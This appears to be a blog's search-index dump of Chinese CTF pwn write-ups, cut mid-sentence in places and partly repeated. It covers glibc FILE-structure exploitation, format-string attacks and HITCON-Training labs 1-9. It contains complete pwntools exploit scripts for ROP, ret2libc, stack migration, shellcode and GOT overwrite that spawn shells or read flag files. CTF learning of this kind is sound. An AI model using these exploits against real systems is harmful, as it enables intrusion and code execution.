_wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = &#39;\\000&#39; &amp;lt;repeats 19 times&amp;gt; }, vtable = 0x7ffff7dcc498}0x07 WCTF 2017 wannaheap关于这题，和FSOP的关系不是那么大，更多考察的是FILE Structure的理解，更具体的是_IO_buf_base与_IO_buf_end这两个element。Play with FILE Structure Yet Another Binary Exploitation Technique 内有这题的所有背景知识： 2.2小节， FILE Struture的结构，字段的作用 2.3小节， fread/fwrite的workflow (fread/scanf/fgets都是一样的，底层都会调用stdin file structure) 3.3.4小节，对于劫持程序流的理解该文章对于这题的利用手法写的很详细了，完全按照他的思路来就可以做出这题。（小提示：这题完全不用管他实现的乱七八糟的堆块分配算法~~）因为pwnable.tw的rule，所以不贴完整的exp了，只贴下做这题时学到的知识点。 调用scanf/fgets这些函数时，glibc底层会调用read(0, _IO_buf_base, size(_IO_buf_end - _IO_buf_base))stream buffer大小是由_IO_buf_end - _IO_buf_base决定 劫持控制流的思路，因为有seccomp，所以这题只能走ROP。而且需要栈迁移，把rsp指到ROP chain上，这点setcontext是最方便的，所以首要的任务就是控制rdi寄存器 最先想到的肯定是最容易的写malloc_hook，直接写上setcontext，如果malloc可以指定大小，写入的内容就可以控制rdi，但是这题malloc值的固定的。所以无法控制rdi 文章的方式是使用unsorted bin attack在_dl_open_hook上写上main_arena+0x88 原理是：当malloc或者free出错时，触发mallocprinterr -&amp;gt; __libc_message -&amp;gt; xxxx -&amp;gt; __libc_dlopen_mode __libc_dlopen_mode (const char *name, int mode){ struct do_dlopen_args args; args.name = name; args.mode = mode; args.caller_dlopen = RETURN_ADDRESS (0); #ifdef SHARED if (__glibc_unlikely (_dl_open_hook != NULL)) return _dl_open_hook-&amp;gt;dlopen_mode (name, mode); &amp;lt;==== 这一行 return (dlerror_run (do_dlopen, &amp;amp;args) ? NULL : (void *) args.map); 触发的是_dl_open_hook-&amp;gt;dlopen_mode (name, mode)，也就是**_dl_open_hook *_dl_open_hook = main_arena+0x88 =&amp;gt; rax point to main_arena+0x88 **_dl_open_hook = *main_arena+0x88 = gadget =&amp;gt; control rip 使用mov rdi, rax ; call qword ptr [rax + 0x20]就可以控制rdi了 FSOP方式 常规的触发方式不行，abort会触发系统调用，由于沙箱限制程序调用；程序无法从main返回；程序退出使用_exit，不会触发flussh, 而程序中的exit无法调用到 改stdin的vtable，scanf会触发stdin的underflow，所以劫持stdin vtable的underflow函数。可以改成_IO_wfile_sync，_IO_wfile_sync会调用fp-&amp;gt;_IO_codevt，将stdin的_IO_codecvt写setcontext，就可以控制rdi位stdin fp，rip为setcontext malloc_hook改abort，触发FSOP，(不能直接填_IO_flush_all_lockp的地址，填abort中call _IO_flush_all_lockp前一点点)。改stdin的chain，指到fake file structure，控制rdi为fake file fp, rip为setcontext malloc_hook改glibc中的exit control stdin’s _markers, _IO_save_base, _IO_save_end and _IO_read_base 控制这几个字段，就可以控制malloc、free、memcpy，达成任意地址写。 最后，需要对文件描述符有清楚的认知哦 带你破案：文件描述符到底是什么？ 0x08 HITCON 2017 : Ghost in The Heap程序附件更多是考察堆排布三个要点 通过free时触发malloc consolidate，获得unsorted bin chunk off-by-null的利用：参考shrink the chunk，构造overlap的思路是一样的 打unsorted bin attack，写_IO_buf_end0x09 HCTF2017 babyprintf0x10 Other Trick (house of xxx)house of wiki 通过assert触发 需要修改_IO_file_sync，以及_IO_helper_jumps + 0xa0和_IO_helper_jumps+0xa8，暴力达成setcontext条件 glibc2.29之后才可用，从2.29之后vtable 可写house of pig glibc2.28之后，_IO_str_overflow中的相对地址调用修改了malloc和free https://hitworld.github.io/posts/7d2bf29a/house of emma 需要修改或leak tls，打爆指针保护。体感不太好用house of apple 还没太细看，粗略的看了眼是收集了一些相对好用的利用链 使用广度有待考察IO_FILE利用随glibc版本的变动 glibc-2.24 新增vtable check glibc-2.27 abort不再调用_IO_flush_all_lockp glibc-2.28 glibc2.28之后_IO_str_overflow 等系列函数实现上取消了相对地址调用，改为了malloc和free，而其参数可以控制，因此可以利用这点来进行非预期的堆块申请和释放，例如house of pig 注：2.29比较特别，还是相对地址调用 glibc-2.29 glibc2.29之后vtable可写了 " }, { "title": "format string attack学习笔记", "url": "/posts/format-string-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2022-08-15 20:32:00 +0800", "snippet": "HITCON-training lab7-9lab73个format string attck的题，格式化字符串认知还比较浅，边做边学习。 格式化字符串利用的本质：达成任意地址的读写 要达成格式化字符串利用，有两个关键： 1、找到printf(&amp;amp;buf)中这个buf是printf的第几个参数，在32位程序下，参数都是放在栈上，所以从栈顶esp开始算起，buf的地址是在栈上的第几个。在64位程序下，前6个参数在寄存器上，所以栈上的参数是从第7个开始。 ​ 要知道这个buf是第几个参数的原因是，可以知道我们后续要填入的目标地址（一般是地址）是第几个参数（从buf到要填入的地址 有时候需要padding），然后配合第二条，就可以向目标地址读或者写 2、利用%n$，表示是printf的第n+1个参数，可以精确控制到stack上的某个地址，（理解下上一步计算目标地址是第几个参数） 使用%p、%s等实现读，使用%c、%n 实现写 首先记录下基本操作 程序存在格式化字符串漏洞 GDB中断点断在printf(&amp;amp;buf)， printf(&quot;%7$p&quot;) ，%*$是指定p要读第几个参数，%7$p是表示读printf的第8个参数（因为第一个参数是(&quot;%7$p&quot;) 上面这是32位机器的情况下，64位机器下参数首先是存在寄存器中，如下图 利用：构造任意地址读 原理： 讲人话： 找到字符串的偏移(是第几个参数) 可以看到字符串的地址是0xffffd1b8，是在栈上的第11个参数，对应格式化字符串就是%10$ 那只要在0xffffd1b8处存入指定的地址，在0xffffd1bc处存入%10$s (用%s来将该address做dereference将内容当做字符串打印出来) 结果printf的打印出来的内容长这样， 分解下，前四个字节是指定的地址值，后四个字节是该地址里的值 如果address中有null byte，会把字符串截断，解决办法是把address挪后面去。 好了，回到这道题没有开启PIE，stack和bss段都是固定的，所以后面可以做固定的偏移，一个简单的格式化字符串漏洞程序，想要leak的值是全局变量password，地址是0x804a048字符串0xffffd1b8是printf的第11个参数，转换下是%10$那么只需要传入p = p32(0x804a048) + &#39;%10$s&#39;，就可以拿到0x804a048地址的值exp:from pwn import *r = process(&#39;./crack&#39;)# context.log_level=&quot;debug&quot;# raw_input(&#39;&#39;)r.recvuntil(&#39;?&#39;)p = p32(0x804a048) + &#39;%10$s&#39;r.sendline(p)r.recvuntil(&#39;Hello ,&#39;)password = u32(r.recv(8)[4:])print(password)r.recvuntil(&#39;Your password :&#39;)r.sendline(str(password))r.interactive()lab8 利用：任意地址写 %n 可以对特定参数写入数值，写入的数值大小等于目前已显示的字节数 如 12345%3$n表示对第四个参数指向的位置写入len(“12345”)=5这个数值 虽然很弱智，但这里还是要重点要指明的是，注意是指针指向的位置，而不是物理上的第几个参数位置，例如 0x7fffffffe120是printf的第13个参数，我们的格式化字符串是%8c%12$hhn，把第13个参数处的值修改一字节为8 结果如图 改的不是0x7fffffffe130这个值 stack_off -&amp;gt; pointer -&amp;gt; value 操纵这个指针来修改值 0x5555555547c0 -&amp;gt; 0x555555554708 可以配合%c来做写入 %xxc为打印出xx个字节到屏幕上 %123c%3$n表示对第四个参数写入123这个数值 向指定地址写入特定值 %n写入的大小为4个字节；%ln是8个字节；%hn是2个字节；%hhn是1个字节 一次多个format string拼接时，要注意前面已经打印的字符数 例如第一次写入的是%30c%3$n，对第四个参数写入30。后面继续写的值就要减掉30，假设后续要再对第5个参数写100，我就要写入100-30=70 最后生成的字符串就是%30c%3$n%70c%4$n 好了，回到这道题没有开启PIE要写两种利用，修改magic为0XDA以及修改为0xFACEB00C，分别是写1个字节和写4个字节断在print处，可以看到print的字符串是第8个参数对应的就是%7$验证没错：现在任务就是修改magic为0xda0xffffd11c处填入magic的地址0x804A038，接上格式化字符串%214c%7hhn。 0xda-4=214，减去4是因为写上0x804A038已经有了4个字节。hhn是修改一个字节exp:from pwn import *r = process(&#39;./craxme&#39;)# raw_input()r.recvuntil(&#39;Give me magic :&#39;)magic = 0x804A038p = p32(magic)p += &#39;%214c%7$hhn&#39;r.sendline(p)r.interactive()然后是修改4个字节exp:from pwn import *r = process(&#39;./craxme&#39;)r.recvuntil(&#39;Give me magic :&#39;)magic = 0x804A038 # 0xFACEB00Cp = p32(magic)p += p32(magic+1)p += p32(magic+2)p += p32(magic+3)p += &#39;%252c%7$hhn&#39; # 修改第一个字节,0xc-16+256, 前面有16个字节(4个目标地址)所以要减去16, 0xc-16是负数了，再加上256造成环绕p += &#39;%164c%8$hhn&#39; # 修改第二个字节，0xb0-0xc, 减去0xc是因为前面总共是0xc个字节p += &#39;%30c%9$hhn&#39; # 修改第三个字节，0xce-0xbop += &#39;%44c%10$hhn&#39; # 修改第四个字节，0xfa-0xcer.sendline(p)r.interactive()题目中给的是32位的程序，自己编了个64位的程序，64位程序的利用稍微有点不一样修改一个字节：from pwn import *r = process(&#39;./craxme2&#39;)r.recvuntil(&#39;Give me magic :&#39;)magic = 0x601064# buf刚好在栈顶，也就是printf的第7个参数，但是64位程序中，地址经常不到8字节，就会用null byte，导致截断string。所以64位程序利用时，要把格式化字符串放前面，目标地址放后面。# 这里把目标地址padding到printf的第17个参数，也就是%16$。稍微算下字符串长度就可以知道，先padding到0x50，然后加上目标地址p = (&quot;%&quot; + str(0xda) + &quot;c&quot; + &quot;%16$n&quot;).ljust(0x50, &quot;a&quot;)p += p64(magic)r.sendline(p)r.interactive()修改四个字节from pwn import *r = process(&#39;./craxme2&#39;)raw_input()r.recvuntil(&#39;Give me magic :&#39;)magic = 0x601064 # target: 0xfaceb00cp = &quot;%&quot; + str(0x0c) + &quot;c&quot; + &quot;%16$hhn&quot;p += &quot;%&quot; + str(0xb0 - 0x0c) + &quot;c&quot; + &quot;%17$hhn&quot; # 第二个目标值是0xb0，上一波已经打印的字符数是0x0c，所以这次打印0xb0-0x0c个字符，这样第18个参数处（%17$）的值就是0xb0。# 这里要注意的是，减去上一波的值，这个值指的是已经打印在屏幕上的字符数，所以是0x0c，而不是p这个字符串的长度，意思就是&quot;%16$hhn&quot;这一段是不计算在内的。显然这是废话，但是还是写一下。。p += &quot;%&quot; + str(0xce - 0xb0) + &quot;c&quot; + &quot;%18$hhn&quot;p += &quot;%&quot; + str(0xfa - 0xce) + &quot;c&quot; + &quot;%19$hhn&quot;p = p.ljust(0x50, &quot;a&quot;)p += p64(magic)p += p64(magic+1)p += p64(magic+2)p += p64(magic+3)r.sendline(p)r.interactive()lab9 格式化字符串buf 不在stack时怎么办？trick1: RBP Chain首先：该trick的本质还是利用格式化字符串，把地址写到stack上（只是这个写地址的过程 比较心酸。。。），其实和上面的是一样的。 假设现在有个format string的漏洞，在main function下两层的function中 main -&amp;gt; func1 -&amp;gt; func2 -&amp;gt; printf (不是必须要ebp链，举这个例子只是因为比较好理解，只要能一些可控的指针链就行) 利用func2’s stack frame（简称第二层，其他类比）中的rbp来控制第一层的rbp这个pointer，再利用第一层的rbp来写值 图解：trick2: Argv Chain做法和rbp chain类似，不过argv利用的是main function传递的argv来控制指针&amp;amp;argv -&amp;gt; argv -&amp;gt; argv[0]但是要注意argv[0]每次offset都不固定，需要先leak来确认参数位置回到这到题目：gdb断在printf处，关键的几个ebp位置stack排布如图所示思路就很清晰了，先操控arg7，把arg11加4字节，让第一层的ebp指向__libc_start_main+241那一格，也就是main函数那层的return address。然后一直一字节一字节的写，把return address改成rop chain。 记得把第一层的ebp再改回来，改成原来的ebp，不然main函数的stack frame就无法复原了这个exp还贼难写，写了一大堆，发现最后寄了！！！这寄吧main函数的leave &amp;amp; ret 中间怎么还有条lea esp, [ecx-4] !!! 寄！ROP是行不通了，换个路子 不过想想，相救应该还是能就救回来的，不就这几行操作吗 .text:080485B3 mov ecx, [ebp-4].text:080485B6 leave.text:080485B7 lea esp, [ecx-4].text:080485BA retn 在rop的时候再调整下栈帧，应该也行的。但是还是算了，换个方法保平安虚假的exp#encoding=UTF-8from pwn import *r = process(&#39;./playfmt&#39;)libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)context.log_level=&#39;debug&#39;context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]raw_input()# context.log_level=&#39;debug&#39;r.recvuntil(&#39;Magic echo Server\\n=====================&#39;)r.sendline(&quot;#%15$p#&quot;)r.recvuntil(&#39;#&#39;)libc_start_main_addr = int(r.recv(10), 16) - 241libc_start_main_off = libc.symbols[&#39;__libc_start_main&#39;]libc_addr = libc_start_main_addr - libc_start_main_offlog.success(&#39;libc addr ===&amp;gt; {}&#39;.format(hex(libc_addr)))system_addr = libc_addr+ libc.symbols[&#39;system&#39;]bin_sh_addr = libc_addr + libc.search(&#39;/bin/sh&#39;).next()#得先leak出第一层ebp的值r.sendline(&quot;aaaa%10$p&quot;)r.recvuntil(&#39;aaaa&#39;)ebp1 = int(r.recvline()[:-1], 16)log.success(&quot;ebp1 point to ===&amp;gt; {}&quot;.format(hex(ebp1)))num = ebp1 &amp;amp; 0xff # 第一层ebp指向下一格p = &quot;%&quot; + str(num+0x4) + &quot;c&quot; + &quot;%6$hhn&quot;r.sendline(p)r.recvline()#用第一层的ebp写值#写system system = 0xf7e193d0p = &quot;%&quot; + str(0xd0) + &quot;c&quot; + &quot;%10$hhn&quot;r.sendline(p)r.recvline()p = &quot;%&quot; + str(num+0x5) + &quot;c&quot; + &quot;%6$hhn&quot;r.sendline(p)r.recvline()p = &quot;%&quot; + str(0x93) + &quot;c&quot; + &quot;%10$hhn&quot;r.sendline(p)r.recvline()p = &quot;%&quot; + str(num+0x6) + &quot;c&quot; + &quot;%6$hhn&quot;r.sendline(p)r.recvline()p = &quot;%&quot; + str(0xe1) + &quot;c&quot; + &quot;%10$hhn&quot;r.sendline(p)r.recvline()# 因为缓冲区没有清空，导致IO 乱的一比，下面数据全部加上后缀，接受到后缀后再发送新的数据p = &quot;%&quot; + str(num+0x7) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(0xf7) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)log.success(&#39;system write done!!!!&#39;)# 第一层ebp指向下一格p = &quot;%&quot; + str(num+0x8) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)#用第一层的ebp写值#随便写，写个0001p = &quot;%&quot; + str(1) + &quot;c&quot; + &quot;%10$nqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)pause()# 第一层ebp指向下一格p = &quot;%&quot; + str(num+0x4*3) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)#用第一层的ebp写值#写/bin/sh bin_sh = 0xf7f5a1dbp = &quot;%&quot; + str(0xdb) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(num+0x4*3+1) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(0xa1) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(num+0x4*3+2) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(0xf5) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(num+0x4*3+3) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(0xf7) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)log.success(&#39;/bin/sh write done!!!&#39;)#把第一层ebp改回来p = &quot;%&quot; + str(num) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)r.sendline(&#39;quit&#39;)r.interactive() 虽然上面的方法是失败了，但是还是学到了东西 1、printf在处理格式化字符串时，取地址的操作是一次性完成的，而不是一边改一边写。什么意思呢。比如我一开始是想把payload字符串一次性写好的，指针动一字节，写一字节，再动一字节，再写一字节。然后调试的时候发现根本不会动，笑死，一直在原地写。所以实际操作的时候只能先发送动一字节的payload，然后再发送写一字节的payload，这样子得分开着发。 2、IO很乱的时候，试着加上前缀或者后缀，可以有效的控制IO符合原本的预期 3、写ROP前，特么的先看下function epilogue的汇编实现，别ROP整到最后，栈帧都已经安排的明明白白了，一行调整栈顶的操作导致前功尽弃。改printf的got吧思路1如图但是实际跑的时候发现，IO还是顶不住。。看来这个方法的效率还是太低了，要打印太多次字符再再再换个方法尝试利用这两条链 0xffffd1ec —▸ 0x804857c (play+51) 0xffffd1f0 —▸ 0x8048645 为什么选这俩呢，是因为高2位和printf_got是一样的，可以少一次打印一堆字符再用hn写进去思路如图：调试过程图记录一下：exp:#encoding=UTF-8from pwn import *r = process(&#39;./playfmt&#39;)elf = ELF(&#39;./playfmt&#39;)libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)context.log_level=&#39;debug&#39;context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]def debug(): gdb.attach(r, &#39;b *0x804853B&#39;) pause()r.recvuntil(&#39;Magic echo Server\\n=====================&#39;)r.sendline(&quot;#%15$p#&quot;)r.recvuntil(&#39;#&#39;)libc_start_main_addr = int(r.recv(10), 16) - 241libc_start_main_off = libc.symbols[&#39;__libc_start_main&#39;]libc_addr = libc_start_main_addr - libc_start_main_offlog.success(&#39;libc addr ===&amp;gt; {}&#39;.format(hex(libc_addr)))system_addr = libc_addr+ libc.symbols[&#39;system&#39;]printf_got = elf.got[&#39;printf&#39;]# leak出arg4和arg5的地址r.sendline(&#39;qwer%6$p#&#39;)r.recvuntil(&#39;qwer&#39;)ebp = int(r.recvuntil(&#39;#&#39;)[:-1], 16)arg4 = ebp-28arg5 = ebp-24log.success(&#39;arg4 addr ===&amp;gt; {:x}&#39;.format(arg4))log.success(&#39;arg5 addr ===&amp;gt; {:x}&#39;.format(arg5))# leak出arg22和arg23的值r.sendline(&quot;qwer%21$p#%22$p#&quot;)r.recvuntil(&#39;qwer&#39;)arg22 = int(r.recvuntil(&#39;#&#39;)[:-1], 16)arg23 = int(r.recvuntil(&#39;#&#39;)[:-1], 16)log.success(&#39;arg22 point to ===&amp;gt; {:x}&#39;.format(arg22))log.success(&#39;arg23 point to ===&amp;gt; {:x}&#39;.format(arg23))p = &#39;%&#39; + str(arg4 &amp;amp; 0xffff) + &#39;c&#39; + &#39;%21$hn&#39; + &#39;aaaa&#39; + &#39;%22$hnqwer&#39;r.sendline(p)r.recvuntil(&#39;qwer&#39;)# pause()# 修改arg4和arg5的值，创造出printf_got和printf_got+2 这俩指针low = printf_got &amp;amp; 0xffffp = &#39;%&#39; + str(low) + &#39;c&#39; + &#39;%57$hn&#39; + &#39;aa&#39; + &#39;%59$hnqwer&#39;r.sendline(p)r.recvuntil(&#39;qwer&#39;)# pause()# debug()#向printf_got中写入systemlow = system_addr &amp;amp; 0xffffhigh = system_addr &amp;gt;&amp;gt; 16p = &#39;%&#39; + str(low) + &#39;c&#39; + &#39;%3$hn&#39; + &#39;%&#39; + str(high-low) + &#39;c&#39; + &#39;%4$hnqwer&#39;r.sendline(p)r.recvuntil(&#39;qwer&#39;)r.sendline(&#39;/bin/sh\\x00&#39;)r.interactive()&#39;&#39;&#39;# 因为IO流爆了，调试了半天不太行#写printf_gotlow = printf_got &amp;amp; 0xffffhigh = printf_got &amp;gt;&amp;gt; 16p = &quot;%&quot; + str(low) + &quot;c&quot; + &quot;%10$hn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(num + 2) + &quot;c&quot; + &quot;%6$hhn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(high) + &quot;c&quot; + &quot;%10$hn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)#向printf_got中写systemlow = system_addr &amp;amp; 0xffffhigh = system_addr &amp;gt;&amp;gt; 16p = &quot;%&quot; + str(low) + &quot;c&quot; + &quot;%14$hn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)print(&#39;system的低2字节已经写入&#39;)print(&#39;ebp1重新指回&#39;)p = &quot;%&quot; + str(num) + &quot;c&quot; + &quot;%6$hhn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)print(&#39;指向printf_got的高2字节&#39;)p = &quot;%&quot; + str((printf_got &amp;amp; 0xff) + 2) + &quot;c&quot; + &quot;%10$hhn qwer&quot; # 关键，把指针指向printf_got的高2字节，然后继续写入system的高2字节r.sendline(p)r.recvuntil(&#39;qwer&#39;)#写system的高2字节p = &quot;%&quot; + str(high) + &quot;c&quot; + &quot;%14$hn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)&#39;&#39;&#39;" }, { "title": "HITCON-Traning lab1-lab15", "url": "/posts/HITCON-Training-lab1-lab15/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2022-07-26 23:05:00 +0800", "snippet": "跟着angelboy大神学习pwnlab1考察gdb动态调试方法有很多，断在read获取到fd的值，然后输入一样的值。 或者断在if，直接修改eip指针lab2题目使用prctl 限制了系统调用cat /usr/include/linux/prctl.h 查看38和22对应的FLAG大致意思就是禁止了execve题目考点就是手写汇编生成shellcode，执行read、open、write三个函数来读取flag，内容为：fp = open(&quot;flag&quot;, 0)read(fp, buf, 0x30)write(1, buf, 0x30)# 系统函数介绍参考 https://www.cnblogs.com/tongye/p/9830006.htmlexp:from pwn import *r = process(&#39;./orw.bin&#39;)r.recvuntil(&#39;:&#39;)&quot;&quot;&quot;fp = open(&#39;flag&#39;, 0)read(fp, buf, 0x30)write(1, buf, 0x30)&quot;&quot;&quot;p = asm(&quot;&quot;&quot; jmp file orw : pop ebx mov eax, 5 xor ecx, ecx int 0x80 mov ebx, eax mov ecx, esp mov edx, 30 mov eax, 3 int 0x80 mov edx, 30 mov ebx, 1 mov ecx, esp mov eax, 4 int 0x80 mov eax, 1 int 0x80file : call orw .ascii &quot;flag&quot; .byte 0&quot;&quot;&quot;)# 汇编最后加上了调用exit，没加上陷入死循环了r.sendline(p)r.interactive() push 1; dec byte ptr [esp]; 先将1入栈后在用dec指令减1，得到0用于截断 push 0x67616c66; 再将“flag”入栈作为指针数组的第一个元素 hex(u32(‘flag’)) mov ebx,esp; ebx指向栈顶也就是指向 open函数的第一个参数（指针数组） 字符串也可以这么处理lab3很简单的栈溢出，ret2shellcode但是有一点需要注意，并不能直接通过ida里面所给出s相对偏移来进行填充，需要在gdb里面跑一下才能计算出具体的偏移主要原因是有这行代码from pwn import *r = process(&#39;./ret2sc&#39;)r.recvuntil(&#39;:&#39;)r.sendline(asm(shellcraft.sh()))r.recvuntil(&#39;:&#39;)p = &#39;a&#39;*(28+4) + p32(0x804A060)r.sendline(p)r.interactive()lab4只开启了堆栈不可执行。 题目给了libc一道很简单的ret2libc，但是一开始脑抽了，在libc中取got。。。还是基础不牢固呀取got和libc偏移，还是用pwntools取的写法更优雅一点。gdb里取，或者readelf strings等方法都可以拿到偏移，但就是地址硬编码了，看起来不是很优雅。from pwn import *r = process(&#39;./ret2lib&#39;)elf = ELF(&#39;./ret2lib&#39;)libc = ELF(&#39;./libc&#39;)put_got = elf.got[&quot;puts&quot;]put_off = libc.symbols[&#39;puts&#39;]system_off = libc.symbols[&#39;system&#39;]sh_off = libc.search(&#39;/bin/sh&#39;).next()r.recvuntil(&#39;:&#39;)r.sendline(str(put_got))r.recvuntil(&#39;The content of the address :&#39;)put_addr = int(r.recvuntil(&#39;\\n&#39;), 16)r.recvuntil(&#39;Leave some message for me :&#39;)libc_addr = put_addr - put_offsystem_addr = libc_addr + system_offsh_addr = libc_addr + sh_offp = &#39;a&#39;*(0x38+0x4)p += p32(system_addr)p += &#39;aaaa&#39;p += p32(sh_addr)r.sendline(p)r.interactive()lab5基础的rop栈溢出，然后通过rop执行execve(&quot;/bin/sh&quot;, 0, 0)。 用ROPgadget寻找gadget，控制eax,ebx,ecx,edx4个寄存器有个麻烦点是elf中没有/bin/sh，得自己写一个有两种方法，我写的exp方式是通过gadget向bss中写入第二种方法是通过调用libc的read，elf中有：调用read，然后输入/bin/sh，存到bss中。from pwn import *r = process(&#39;./simplerop&#39;)raw_input()r.recvuntil(&#39;Your input :&#39;)pop_edx_ecx_ebx = 0x0806e850 # pop edx ; pop ecx ; pop ebx ; retpop_eax = 0x080bae06 # pop eax ; retpop_edx = 0x0806e82a # pop edx ; retmov = 0x0807b301 # mov dword ptr [eax], edx ; retsh_addr = 0x80EBB64int_0x80 = 0x080493e1 # int 0x80p = &#39;a&#39;*(0x1c+0x4)# write /bin/shp += p32(pop_eax)p += p32(sh_addr)p += p32(pop_edx)p += &#39;/bin&#39;p += p32(mov)p += p32(pop_eax)p += p32(sh_addr+4)p += p32(pop_edx)p += &#39;/sh\\x00&#39;p += p32(mov)# execve(&quot;/bin/sh&quot;, 0, 0)p += p32(pop_edx_ecx_ebx)p += p32(0)p += p32(0)p += p32(sh_addr)p += p32(pop_eax)p += p32(0x0b)p += p32(int_0x80)r.sendline(p)r.interactive()lab6只溢出了0x40-0x28=24个字节。但是按我的理解，如下图，要实现rop至少也需要4*7=28个字节。所以这题考察的是当栈溢出空间有限的情况下，使用栈迁移方法实现利用。栈迁移的利用思路：from pwn import *r = process(&#39;./migration&#39;)elf = ELF(&#39;./migration&#39;)libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)# context.log_level=&#39;debug&#39;# raw_input()r.recvuntil(&#39;:\\n&#39;)buf1 = elf.bss()+0x500buf2 = elf.bss()+0x600read_plt = elf.plt[&#39;read&#39;]puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]leave_ret = 0x08048418 # leave ; retpop_ebx_ret = 0x0804836d # pop ebx ; retlog.info(&#39;buf1: {}&#39;.format(hex(buf1)))log.info(&#39;buf2: {}&#39;.format(hex(buf2)))# stackp = &#39;a&#39;*0x28p += p32(buf1)p += p32(read_plt)p += p32(leave_ret)p += p32(0)p += p32(buf1)p += p32(0x100)r.send(p)# buf1p = p32(buf2)p += p32(puts_plt)p += p32(pop_ebx_ret)p += p32(puts_got)p += p32(read_plt)p += p32(leave_ret)p += p32(0)p += p32(buf2)p += p32(0x100)r.send(p)puts_addr = u32(r.recvuntil(&#39;\\n&#39;)[:-1])puts_off = libc.symbols[&#39;puts&#39;]system_off = libc.symbols[&#39;system&#39;]bin_sh_off = libc.search(&#39;/bin/sh&#39;).next()libc_addr = puts_addr - puts_offsystem_addr = libc_addr + system_offbin_sh = libc_addr + bin_sh_off#buf2p = p32(buf1)p += p32(system_addr)p += p32(0xdeadbeef)p += p32(bin_sh)r.send(p)r.interactive()坑点1栈溢出调用read，想调试下，看看read是否管用。但是奈何怎么调试，都无法从stdin中输入。代码逻辑也没写错啊。然后发现pwntools中直接继续send数据，是OK的 TM的，破案了。也就是坑点2的关系，之前是用的sendline，习惯性用sendline了。多传的那个\\n变成输入了坑点2如上图，如果用sendline，会多一个/n。。。不多说了，调试下就知道。。lab73个format string attck的题，格式化字符串认知还比较浅，边做边学习。 格式化字符串利用的本质：达成任意地址的读写 要达成格式化字符串利用，有两个关键： 1、找到printf(&amp;amp;buf)中这个buf是printf的第几个参数，在32位程序下，参数都是放在栈上，所以从栈顶esp开始算起，buf的地址是在栈上的第几个。在64位程序下，前6个参数在寄存器上，所以栈上的参数是从第7个开始。 ​ 要知道这个buf是第几个参数的原因是，可以知道我们后续要填入的目标地址（一般是地址）是第几个参数（从buf到要填入的地址 有时候需要padding），然后配合第二条，就可以向目标地址读或者写 2、利用%n$，表示是printf的第n+1个参数，可以精确控制到stack上的某个地址，（理解下上一步计算目标地址是第几个参数） 使用%p、%s等实现读，使用%c、%n 实现写 首先记录下基本操作 程序存在格式化字符串漏洞 GDB中断点断在printf(&amp;amp;buf)， printf(&quot;%7$p&quot;) ，%*$是指定p要读第几个参数，%7$p是表示读printf的第8个参数（因为第一个参数是(&quot;%7$p&quot;) 上面这是32位机器的情况下，64位机器下参数首先是存在寄存器中，如下图 利用：构造任意地址读 原理： 讲人话： 找到字符串的偏移(是第几个参数) 可以看到字符串的地址是0xffffd1b8，是在栈上的第11个参数，对应格式化字符串就是%10$ 那只要在0xffffd1b8处存入指定的地址，在0xffffd1bc处存入%10$s (用%s来将该address做dereference将内容当做字符串打印出来) 结果printf的打印出来的内容长这样， 分解下，前四个字节是指定的地址值，后四个字节是该地址里的值 如果address中有null byte，会把字符串截断，解决办法是把address挪后面去。 好了，回到这道题没有开启PIE，stack和bss段都是固定的，所以后面可以做固定的偏移，一个简单的格式化字符串漏洞程序，想要leak的值是全局变量password，地址是0x804a048字符串0xffffd1b8是printf的第11个参数，转换下是%10$那么只需要传入p = p32(0x804a048) + &#39;%10$s&#39;，就可以拿到0x804a048地址的值exp:from pwn import *r = process(&#39;./crack&#39;)# context.log_level=&quot;debug&quot;# raw_input(&#39;&#39;)r.recvuntil(&#39;?&#39;)p = p32(0x804a048) + &#39;%10$s&#39;r.sendline(p)r.recvuntil(&#39;Hello ,&#39;)password = u32(r.recv(8)[4:])print(password)r.recvuntil(&#39;Your password :&#39;)r.sendline(str(password))r.interactive()lab8 利用：任意地址写 %n 